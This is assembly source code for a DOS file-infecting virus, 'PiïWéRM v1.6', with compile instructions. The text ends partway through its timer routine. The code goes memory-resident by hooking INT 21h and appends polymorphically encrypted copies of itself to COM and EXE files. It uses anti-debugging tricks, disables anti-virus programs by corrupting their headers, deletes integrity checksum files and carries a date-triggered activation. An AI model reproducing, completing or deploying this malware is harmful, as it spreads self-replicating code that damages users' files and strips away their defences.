
; **Beta Code**
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ------
;    PiïWéRM v1.6 coded by ûirogen °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
;      ş Variant A                 °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ------
;
;  See enclosed NFO for more info..
;
;  version 1.5:
;     ş Conditional compilation equates added for creation of new variants
;     ş Improved polymorphic engine
;     ş Fixed possible bug in polymorphic engine after 50 or so generations
;  version 1.6:
;     ş Re-Enabled Constant 1 Byte Garbage Generation
;     ş Changed activation routine
;
;  compile like so:
;   TASM /m pw16
;   Tlink pw16
;   --convert to COM--
;

cseg    segment
	assume  cs: cseg, ds: cseg, es: cseg, ss: cseg

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Compile Options °°°°°°°°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
SECOND_CRYPT equ 0                      ; use second cryptor?
INCLUDE_INT3 equ 1                      ; include INT 3 in garbage code?
					; (slows the loop down alot)
KILL_AV      equ 1                      ; Kill AVs as executed?
KILL_CHKLIST equ 1                      ; Kill MSAV/CPAV checksum filez?
TWO_BYTE     equ 1                      ; Use two byte garbage code?
KILL_DATE    equ 13                     ; day of the month to play with user
MAX_EXE      equ 4                      ; max exe file size -high byte

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Polymorphic Engine Equates °°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
INC_BUF_SIZE   equ 38                   ; INC buf
ENC_OP_BSIZE   equ 38                   ; ENC buf
PTR_BUF_SIZE   equ 38                   ; PTR buf
CNT_BUF_SIZE   equ 38                   ; CNT&OP
DJ_BUF_SIZE    equ 38                   ; DEC&JMP
GARBAGE_OPS    equ 0Fh                  ; # of garbage ops in each group

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Misc. °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
enc_size     equ   offset first_crypt-offset encrypt
enc2_size    equ   offset code_start-offset first_crypt
signal       equ   0FA01h                 ; AX=signal/INT 21h/installation chk
vsafe_word   equ   5945h                  ; magic word for VSAFE/VWATCH API
real_start   equ   offset dj_buf+3        ; starting location of encryted code
cr           equ   0ah

org     0h

start:
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Polymorphic Encryptor/Decryptor Buffer
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
 encrypt:
	ptr_buf    db PTR_BUF_SIZE dup (90h)
 encryptor:
	cnt_buf    db CNT_BUF_SIZE dup(90h)
 enc_loop:
	inc_buf    db INC_BUF_SIZE dup(90h)
	enc_op_buf db ENC_OP_BSIZE dup(90h)
	dj_buf     db DJ_BUF_SIZE dup (90h)
	ret_byte db 090h                ; C3h or a NOP equiv.
first_crypt:                            ; end of first cryptor


; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Second Decryptor - Anti-Debugging °°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ş Uses reverse direction word XOR encryption
; ş Uses the following techniques:
;    ğ JMP into middle of operand
;    ğ Replace word after CALL to kill stepping over call
;    ğ Kills INT 1 vector
;    ğ Disables Keyboard via Port 21h
;    ğ Reverse direction encryption prevents stepping past loop
;    ğ Uses SP as a crucial data register in some locations - if
;      the debugger uses the program's stack, then it may very well
;      phuck thingz up nicely.
;    ğ Uses Soft-Ice INT 3 API to lock it up if in memory.
;
	sti                             ; fix CLI in garbage code
	db      0BDh                    ; MOV BP,XXXX
bp_calc dw      0100h
	push    ds es                   ; save segment registers for EXE
IF SECOND_CRYPT
	push    ds
dbg1:   jmp     mov_si                  ; 1
	db      0BEh                    ; MOV SI,XXXX
mov_si: db      0BEh                    ; MOV SI,XXXX
rel2_off dw     offset heap+1000h       ; org copy: ptr way out there
	call    shit
add_bp: int     19h                     ; fuck 'em if they skipped
	jmp     in_op                   ; 1
	db      0BAh                    ; MOV DX,XXXX
in_op:  in      al,21h
	push    ax
	or      al,02
	jmp     kill_keyb               ; 1
	db      0C6h
kill_keyb: out  21h,al                  ; keyboard=off
	call    shit6
past_shit: jmp  dbl_crypt
shit7:
	xor     ax,ax                   ;null es
	mov     es,ax
	mov     bx,word ptr es: [06]    ;get INT 1
	ret
shit:
	mov     word ptr cs: add_bp[bp],0F503h ;ADD SI,BP
	mov     word ptr cs: dec_si[bp],05C17h ;reset our shit sister
	ret
shit2:
	mov     word ptr cs: dec_si[bp],4E4Eh
	mov     word ptr cs: add_bp[bp],19CDh ;reset our shit brother
	call    shit3
	jnc     code_start              ;did they skip shit3?
	xor     dx,cx
	ret
	db      0EAh                    ;JMP FAR X:X
shit4:
	db      0BAh                    ;MOV DX,XXXX
sec_enc dw      0
	mov     di,4A4Dh                ;prepare for Soft-ice
	ret
shit3:
	mov     ax,911h                 ;soft-ice - execute command
	call    shit4
	stc
	dec     word ptr es: [06]       ;2-kill INT 1 vector
	push    si
	mov     si,4647h                ;soft-ice
        int     3                       ;call SI execute - DS:DX-garbage
	pop     si
	ret

shit6:  mov     byte ptr cs: past_shit[bp],0EBh
	out     21h,al                  ; try turning keyboard off again
	ret

dbl_crypt:                              ; main portion of cryptor
	mov     cx,(offset heap-offset ret2_byte)/2+1
	call    shit7
dbl_loop:
	jmp     $+3                     ; 1
	db      034h                    ; XOR ...
	call    shit3                   ; nested is the set DX
	xchg    sp,dx                   ; xchg SP and DX
	jmp     xor_op                  ; 1
	db      0EAh                    ; JMP FAR X:X
xor_op: xor     word ptr cs: [si],sp    ; the real XOR baby..
	xchg    sp,dx                   ; restore SP
	call    shit2
dec_si: pop     ss                      ; fuck 'em if they skipped shit2
	pop     sp
	int     3
	xchg    sp,bx                   ; SP=word of old int 1 vec
	dec     cx
	mov     es: [06],sp             ; restore int 1 vector
	xchg    sp,bx                   ; restore SP
	jnz     dbl_loop
ret2_byte db    90h,90h


ENDIF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Start of Viral Code °°°°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

code_start:
IF SECOND_CRYPT
	pop     ax es                   ; Get port reg bits (ES=PSP)
	out     21h,al                  ; restore keyboard
ENDIF

	mov     cs: activate[bp],0      ; reset activation toggle
	mov     cs: mem_word[bp],0      ; reset mem. encryption

	inc     si                      ; SI!=0
	mov     dx,vsafe_word           ; remove VSAFE/VWATCH from memory
	mov     ax,0FA01h               ; & check for residency of virus too
	int     21h
	or      si,si                   ; if SI=0 then it's us
	jz      no_install

	mov     ah,2ah                  ; get date
	int     21h
	cmp     dl,KILL_DATE            ; is it time to activate?
	jnz     not_time
	mov     cs: activate[bp],1

not_time:

	mov     ax,es                   ; PSP segment   - popped from DS
	dec     ax                      ; mcb below PSP m0n
	mov     ds,ax                   ; DS=MCB seg
	cmp     byte ptr ds: [0],'Z'    ; Is this the last MCB in chain?
	jnz     no_install
	sub     word ptr ds: [3],(((vend-start+1023)*2)/1024)*64 ; alloc MCB
	sub     word ptr ds: [12h],(((vend-start+1023)*2)/1024)*64 ; alloc PSP
	mov     es,word ptr ds: [12h]   ; get high mem seg
	push    cs
	pop     ds
	mov     si,bp
	mov     cx,(offset vend - offset start)/2+1
	xor     di,di
	rep     movsw                   ; copy code to new seg
	xor     ax,ax
	mov     ds,ax                   ; null ds
	push    ds
	lds     ax,ds: [21h*4]          ; get 21h vector
	mov     es: word ptr old21+2,ds ; save S:O
	mov     es: word ptr old21,ax
	pop     ds
	mov     ds: [21h*4+2],es        ; new int 21h seg
	mov     ds: [21h*4],offset new21 ; new offset

	call    get_timer
	cmp     dl,5
	jle     no_install
	sub     byte ptr ds: [413h],((offset vend-offset start+1023)*2)/1024 ;-totalmem

no_install:

	xor     si,si                   ; null regs..
	xor     di,di                   ; some progs actually care..
	xor     ax,ax
	xor     bx,bx
	xor     dx,dx

	pop     es ds                   ; restore ES DS
	cmp     cs: exe_phile[bp],1
	jz      exe_return

	lea     si,org_bytes[bp]        ; com return
	mov     di,0100h                ; -restore first 4 bytes
	movsw
	movsw

	mov     ax,100h                 ; jump back to 100h
	push    ax
_ret:   ret

exe_return:
	mov     cx,ds                   ; calc. real CS
	add     cx,10h
	add     word ptr cs: [exe_jump+2+bp],cx
	int     3                       ; fix prefetch
	cli
	mov     sp,cs: oldsp[bp]        ; restore old SP..
	sti
	db      0eah
exe_jump dd     0
oldsp   dw      0
exe_phile db    0

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Infection Routine °°°°°°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;    DS:DX=fname
;    Assumes EXE if first byte is 'M' or 'Z'
;    Changes/Restores attribute and time/date
;
;  If philename ends in 'AV', 'AN', or 'OT' it's not infected and has it's
;  minimum req. memory in the header (0Ah) changed to FFFFh, thus making it
;  unusable.
;
infect_file:

	mov     di,dx                   ; move filename ptr into an index reg
	push    ds                      ; search for end of filename(NULL)
	pop     es
	xor     ax,ax
	mov     cx,128
	repnz   scasb

	cmp     word ptr [di-3],'EX'    ;.eXE?
	jz      is_exec
chk_com: cmp    word ptr [di-3],'MO'    ;.cOM?
	jnz     _ret
is_exec:
IF KILL_AV
	mov     cs: isav,0
	cmp     word ptr [di-7],'VA'    ;*AV.*? CPAV,MSAV,TBAV,TNTAV
	jz      anti_action
	cmp     word ptr [di-7],'TO'    ;*OT.*? F-PROT
	jz      anti_action
	cmp     word ptr [di-7],'NA'    ;*AN.*?
	jnz     name_ok
	cmp     word ptr [di-9],'CS'    ;*SCAN.*?
	jnz     name_ok
anti_action:
	inc     cs: isav                ; set mark for anti-virus kill
name_ok:
ENDIF
	push    ds                      ; save fname ptr segment
	mov     es,ax                   ; NULL ES  (ax already 0)
	lds     ax,es: [24h*4]          ; get INT 24h vector
	mov     old_24_off,ax           ; save it
	mov     old_24_seg,ds
	mov     es: [24h*4+2],cs        ; install our handler
	mov     es: [24h*4],offset new_24
	pop     ds                      ; restore fname ptr segment
	push    es
	push    cs                      ; push ES for restoring INT24h later
	pop     es                      ; ES=CS

	mov     ax,4300h                ; get phile attribute
	int     21h
	mov     ax,4301h                ; null attribs 4301h
	push    ax cx ds dx             ; save AX-call/CX-attrib/DX:DS
	xor     cx,cx                   ; zero all
	int     21h

	mov     bx,signal
	mov     ax,3d02h                ; open the file
	int     21h
	jc      close                   ; if error..quit infection

	xchg    bx,ax                   ; get handle

	push    cs                      ; DS=CS
	pop     ds

IF KILL_CHKLIST
	call    kill_chklst             ; kill CHKLIST.MS & .CPS filez
ENDIF
	mov     ax,5700h                ; get file time/date
	int     21h
	push    cx dx                   ; save 'em for later

	mov     ah,3fh                  ; Read first bytes of file
	mov     cx,18h                  ; EXE header or just first bytes of COM
	lea     dx,org_bytes            ; buffer used for both
	int     21h

	call    offset_end              ; set ptr to end- DXAX=file_size

	cmp     byte ptr org_bytes,'M'  ; EXE?
	jz      do_exe
	cmp     byte ptr org_bytes,'Z'  ; EXE?
	jz      do_exe
	cmp     byte ptr org_bytes+3,0  ; CoM infected?
	jz      d_time

	dec     exe_phile

	push    ax                      ; save file size
	add     ax,100h                 ; PSP in com
	mov     rel_off,ax              ; save it for decryptor
	mov     bp_calc,ax

	call    encrypt_code            ; copy and encrypt code

	lea     dx,vend                 ; start of newly created code
	mov     cx,offset heap+0FFh     ; virus length+xtra
	add     cl,size_disp            ; add random  ^in case cl exceeds FF
	mov     ah,40h
	int     21h                     ; append virus to infected file

	call    offset_zero             ; position ptr to beginning of file

	pop     ax                      ; restore COM file size
	sub     ax,3                    ; calculate jmp offset
	mov     word ptr new_jmp+1,ax   ; save it..

	lea     dx,new_jmp              ; write the new jmp (E9XXXX,0)
	mov     cx,4                    ; total of 4 bytes
	mov     ah,40h
	int     21h

d_time:

	pop     dx cx                   ; pop date/time
	mov     ax,5701h                ; restore the mother fuckers
	int     21h

close:

	mov     ah,3eh                  ; close phile
	int     21h

	pop     dx ds cx ax             ; restore attrib
	int     21h

dont_do:
	pop     es                      ; ES=0
	lds     ax,dword ptr old_24_off ; restore shitty DOS error handler
	mov     es: [24h*4],ax
	mov     es: [24h*4+2],ds

	ret                             ; return back to INT 21h handler

do_exe:
	cmp     dx,MAX_EXE
	jg      d_time

	mov     exe_phile,1

IF KILL_AV
	cmp     isav,1                  ; anti-virus software?
	jnz     not_av
	mov     word ptr exe_header[0ah],0FFFFh ; change min. mem to FFFFh
	jmp     write_hdr
not_av:
ENDIF
	cmp     word ptr exe_header[12h],0 ; checksum 0?
	jnz     d_time

	mov     cx,mem_word             ; get random word
	inc     cx                      ; make sure !0
	mov     word ptr exe_header[12h],cx ; set checksum to!0
	mov     cx,word ptr exe_header[10h] ; get old SP
	mov     oldsp,cx                ; save it..
	mov     word ptr exe_header[10h],0 ; write new SP of 0

	les     cx,dword ptr exe_header[14h] ; Save old entry point
	mov     word ptr exe_jump, cx   ; off
	mov     word ptr exe_jump[2], es ; seg

	push    cs                      ; ES=CS
	pop     es

	push    dx ax                   ; save file size DX:AX
	cmp     byte ptr exe_header[18h],52h ; PKLITE'd? (v1.13+)
	jz      pklited
	cmp     byte ptr exe_header[18h],40h ; 40+ = new format EXE
	jge     d_time
	pklited:

	mov     bp, word ptr exe_header+8h ; calc. new entry point
	mov     cl,4                    ; *10h
	shl     bp,cl                   ;  ^by shifting one byte
	sub     ax,bp                   ; get actual file size-header
	sbb     dx,0
	mov     cx,10h                  ; divide me baby
	div     cx

	mov     word ptr exe_header+14h,dx ; save new entry point
	mov     word ptr exe_header+16h,ax
	mov     rel_off,dx              ; save it for encryptor
	mov     bp_calc,dx

	call    encrypt_code            ; encrypt & copy the code

	mov     cx,offset heap+0FFh     ; virus size+xtra
	add     cl,size_disp            ; add random ^in case cl exceeds FFh
	lea     dx,vend                 ; new copy in heap
	mov     ah,40h                  ; write the damn thing
	int     21h

	pop     ax dx                   ; AX:DX file size

	mov     cx,(offset heap-offset start)+0FFh ; if xceeds ff below
	add     cl,size_disp
	adc     ax,cx

	mov     cl,9                    ; calc new alloc (512)
	push    ax
	shr     ax,cl
	ror     dx,cl
	stc
	adc     dx,ax
	pop     ax
	and     ah,1

	mov     word ptr exe_header+4h,dx ; save new mem. alloc info
	mov     word ptr exe_header+2h,ax

write_hdr:
	call    offset_zero             ; position ptr to beginning

	mov     cx,18h                  ; write fiXed header
	lea     dx,exe_header
	mov     ah,40h
	int     21h

	jmp     d_time                  ; restore shit/return


; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Kills CHKLIST.CPS and CHKLIST.MS °°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;

kill_chklst:
	mov     di,2                    ; counter for loop
	lea     dx,chkl1                ; first fname to kill
kill_loop:
	mov     ax,4301h                ; reset attribs
	xor     cx,cx
	int     21h
	mov     ah,41h                  ; delete phile
	int     21h
	lea     dx,chkl2                ; second fname to kill
	dec     di
	jnz     kill_loop

	ret

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Set File PTR °°°°°°°°°°°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

offset_zero:                            ; self explanitory
	xor     al,al
	jmp     set_fp
offset_end:
	mov     al,02h
set_fp:
	mov     ah,42h
	xor     cx,cx
	xor     dx,dx
	int     21h
	ret

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Morph, copy, & crypt °°°°°°°°°°°°°°°°°°

;  0 bytes constant
;  0 functionally equivilant operands in constant locations
;
;  Random byte defined as:
;  76543210
;  ³³³³³³³ÀÄ 0=JNZ,1=JNS
;  ³³³³³³ÀÄÄ 0=ADD&SUB, 1=XOR
;  ³³³³³ÀÄÄÄ 0=BYTE CRYPTION, 1=WORD CRYPTION
;  ³³³³ÀÄÄÄÄ 1=INCREMENT POINTER TO 'MOV SI|DI,XXXX' OPERAND
;  ³³³ÀÄÄÄÄÄ 1=USE TWO BYTE GARBAGE, 0=USE ONE BYTE GARBAGE ONLY
;  ³³ÀÄÄÄÄÄÄ 1=USE CONSTANT STREAM OF ONE BYTE GARBAGE, 0=NORMAL RANDOM
;  ³ÀÄÄÄÄÄÄÄ not used
;  ÀÄÄÄÄÄÄÄÄ not used
;
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encrypt_code:

	push    bx                      ; save the handle

	call    get_timer
IF SECOND_CRYPT
	mov     byte ptr sec_enc,cl     ; use CL\DL for 2nd encryptor
	mov     byte ptr sec_enc+1,dh
ENDIF

	mov     ax,0FFFFh
	call    random
	mov     enc_num,dl              ; store ms count for encryption
	mov     mem_word,dx             ; mem cryption too
	mov     size_disp,dl            ; and size displacment

;ÄÄÄÄ Fill buffer space with one-byte garbage ops

	lea     di,encrypt
	mov     bp,enc_size+1
        test    enc_num,00100000b       ; use constant 1 byte operand?
        jnz     do_constant
        mov     bl,1
        jmp     fb1
do_constant:
        mov     bl,0
fb1:
        call    fill_buffer

;ÄÄÄÄ Randomly select between jmp type : JNZ or JNS

	test    enc_num,00000001b
	jnz     jmp_2
	mov     byte ptr jnz_op,75h     ; use jnz
	jmp     jmp_set
	jmp_2:
	mov     byte ptr jnz_op,79h     ; jns
	jmp_set:

;ÄÄÄÄ Select encryption type: XOR or ADD&SUB

	mov     enc_type,04             ; default to encrypting ADD
	mov     dec_type,2Ch            ; and decrypting SUB
	test    enc_num,00000010b
	jz      use_add_sub
	mov     dec_type,34h            ; decrypting XOR
	mov     enc_type,34h            ; encrypting XOR
	use_add_sub:

;ÄÄÄ Change register used for the counter

	cmp     byte ptr count_op,0BBh  ; skip SP/BP/DI/SI
	jnz     get_reg
	mov     byte ptr count_op,0B7h  ; AX-1
	mov     byte ptr dec_op,47h     ; AX-1
	get_reg:
	inc     byte ptr count_op       ; increment to next register in line
	inc     byte ptr dec_op

;ÄÄÄÄ Select position of INC DI|SI

	mov     ax,INC_BUF_SIZE-1
	call    random                  ; select a position in the buffer..
	xchg    di,dx
	add     di,offset inc_buf
	mov     inc_op_ptr,di           ; save ptrs
	mov     inc_op_ptr2,di

;ÄÄÄÄ Toggle between SI and DI

	cmp     byte ptr ptr_set,0BEh   ; using SI?
	jz      chg_di                  ; if so, then switch to DI
	mov     byte ptr [di],46h       ; write INC SI
	dec     byte ptr ptr_set        ; decrement to SI
	jmp     done_chg_ptr
	chg_di:
	mov     byte ptr [di],47h       ; write INC DI
	inc     byte ptr ptr_set        ; increment to DI
	inc     byte ptr dec_type       ; increment decryptor
	inc     byte ptr enc_type       ; increment encryptor
	done_chg_ptr:

;ÄÄÄÄ Select word or byte encryption

	mov     w_b,80h                 ; default to byte cryption
	test    enc_num,00000100b       ; use word?
	jz      use_byte
	mov     w_b,81h                 ; now using word en/decryptor
	mov     ax,di
	sub     ax,offset inc_buf+1
	call    random
	mov     ch,byte ptr [di]        ; get INC DI|INC SI operand
	sub     di,dx
	mov     byte ptr [di],ch        ; make a copy of it for word cryption
	mov     inc_op_ptr2,di
 use_byte:

;ÄÄÄÄ Increment counter value

	cmp     byte ptr crypt_bytes,0Fh ; byte count quite large?
	jnz     inc_cnt                 ; if not..increment away
	mov     crypt_bytes,offset vend ; else..reset byte count
	inc_cnt:
	inc     crypt_bytes             ; increment byte count


;ÄÄÄÄ Set DEC XX /JNS|JNZ operands

	mov     ax,DJ_BUF_SIZE-3
	call    random                  ; select a pos.
	add     dx,offset dj_buf
	mov     di,dx
	sub     dx,offset enc_loop-3    ; find loop size
	neg     dx                      ; negate for negative jump
	mov     byte ptr jnz_op+1,dl    ; write jmp offset
	dec     dl
	mov     byte ptr loop_ofs,dl    ; write loop offset
	mov     dec_op_ptr,di
	lea     si,dec_op
	movsb                           ; write operand(s)
write_loop:
	movsw
	inc     di
	add     rel_off,di              ; chg offset for decryption
	push    di                      ; save offset after jmp


;ÄÄÄÄ Set MOV DI,XXXX|MOV SI,XXXX

	mov     ax,PTR_BUF_SIZE-3
	call    random                   ; select pos.
	xchg    dx,di
	add     di,offset ptr_buf        ; build ptr
	mov     ptr_op_ptr,di            ; save ptr
	lea     si,ptr_set
	movsw                            ; write op
	movsb

;ÄÄÄÄ Set MOV AX|BX|DX|CX,XXXX

	mov     ax,CNT_BUF_SIZE-3
	call    random                   ; select pos.
	xchg    dx,di
	add     di,offset cnt_buf        ; build ptr
	mov     count_op_ptr,di          ; save ptr
	lea     si,count_op
	movsw                            ; write op
	movsb

;ÄÄÄÄ Set XOR|ADD&SUB WORD|BYTE CS:|DS:[SI|DI],XX|XXXX

	mov     ax,ENC_OP_BSIZE-5
	call    random                   ; select pos.
	xchg    dx,di
	add     di,offset enc_op_buf     ; build ptr
	mov     enc_op_ptr,di            ; save ptr
	lea     si,seg_op
	movsw                            ; write op
	movsw

IF TWO_BYTE
;ÄÄÄÄ Throw in some 2 byte garbage ops
	test enc_num,00010000b           ; use two-byte garbage?
	jz no_2byte_grb
	lea di,encrypt
	mov bp,ptr_op_ptr
	push bp
	call fill_between
	pop di
	add di,3                         ; 3bytez large
	mov bp,count_op_ptr
	push bp
	call fill_between                ; fill between start and count reg
	pop di
	add di,3                         ; 3bytez large
	mov bp,inc_op_ptr2
	push bp
	call fill_between                ; fill between count reg and inc ptr
	pop di
	inc di                           ; 1byte large
	mov bp,inc_op_ptr
	push bp
	call fill_between                ; if another inc ptr op exist, then
	pop di                           ; .. fill in between both of them
	inc di                           ; 1byte large
	mov bp,enc_op_ptr
	push bp
	call fill_between                ; fill between inc ptr and encryption
	pop di                           ; ..op
	add di,5                         ; 5bytez large
	mov bp,dec_op_ptr
	call fill_between                ; fill between encryption op and loop
no_2byte_grb:
ENDIF

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;°°°°°°°°[END OF POLYMORPHIC ENGINE]°°°°°°°°°°°°°
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄ FiX second cryptor offset

IF SECOND_CRYPT
	mov     rel2_off,offset heap    ;first gen has mispl. off
ENDIF

;ÄÄÄÄ Copy virus code along with decryptor to heap

	mov     cx, (offset heap-offset start)/2+1
	xor     si,si
	lea     di,vend                 ; ..to heap for encryption
	rep     movsw                   ; make another copy of virus

IF SECOND_CRYPT
;ÄÄÄÄ Call second encryptor first

	mov     si,offset vend          ; offset of enc. start..
	add     si,offset heap          ; ..at end of code
	mov     ret2_byte,0C3h
	xor     bp,bp
	call    dbl_crypt
	mov     ret2_byte,90h
ENDIF

;ÄÄÄÄ Set ptr to heap for encryption

	pop     si                      ; pop offset after jmp
	add     si,offset vend          ; offset we'z bez encrypting
	mov     di,si                   ; we might be using DI too

;ÄÄÄÄ Encrypt the mother fucker

	mov     ret_byte,0C3h           ; put RET
	mov     al,enc_type
	mov     bx,enc_op_ptr
	mov     byte ptr [bx+2],al      ; set encryption type
	call    encryptor               ; encrypt the bitch

	pop     bx                      ; restore phile handle
	ret                             ; return

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Garbage Code Filler °°°°°°°°°°°°°°°°°°
;    DS:DI = buffer address
;       BP = buffer size
;       BL = 0 - Use 1 byte constant garbage op
;          = 1 - Use 1 byte random garbage ops
;          = 2 - Use 2 byte random garbage ops
;
;  Decently random..relies on previously encrypted data and MS from clock
;  to form pointer to the next operand to use..
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
fill_buffer:
	push    ax
	mov     ax,GARBAGE_OPS
	call    random
	pop     ax
	mov     si,dx                   ; build index ptr
IF TWO_BYTE
        cmp     bl,2                    ; using 1 byte, or 2 byte ops?
        jz      word_grb
ENDIF
        cmp     bl,0                    ; using constant stream of 1 byte op?
        jnz     not_constant

        mov     si,cons_byte
not_constant:
	mov     al,byte ptr [nops_1+si]   ; get 1byte operand from table
	mov     byte ptr [di],al        ; write operand
IF TWO_BYTE
	jmp     did_1byte
word_grb:
	cmp     di,offset enc_loop-1     ; don't put 2byte op at loop begin
	jnz     di_ok
di_not_ok:
	mov     al,byte ptr [nops_1+si]  ; get 1byte op
	mov     ah,al                    ; duplicate
	jz      couldnt_do_2
di_ok:
	cmp     di,offset encryptor-1   ; don't put 2byte op at call begin
	jz      di_not_ok
	add     si,si                   ; double pointer for word offsets
	mov     ax,word ptr [nops_2+si] ; get garbage op
couldnt_do_2:
	mov     word ptr [di],ax        ; write op
	inc     di                      ; increment ptr
	dec     bp                      ; decrement counter
	jz      _fret
did_1byte:
ENDIF
	inc     di                      ; increment buffer ptr
	dec     bp                      ; decrement counter
	jnz     fill_buffer             ; loop
        cmp     cons_byte,GARBAGE_OPS
        jl      in_range
        mov     cons_byte,-1
in_range:
        inc     cons_byte
_fret:  ret

IF TWO_BYTE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Fill Bytes Between Two Ops /w Garb.°°°°
;  DS:DI=First Op
;  DS:BP=Last Op
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
fill_between:
	sub bp,di                       ; get difference of offsets
	cmp bp,4                        ; if <4 then not 'nuff room
	jl not_room
	sub bp,2                        ; make sure we don't overwrite last op
	mov bl,2                        ; use 2byte garbage ops
	call fill_buffer
not_room:
	ret
ENDIF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Get sec/ms from clock °°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
get_timer:
	push ax
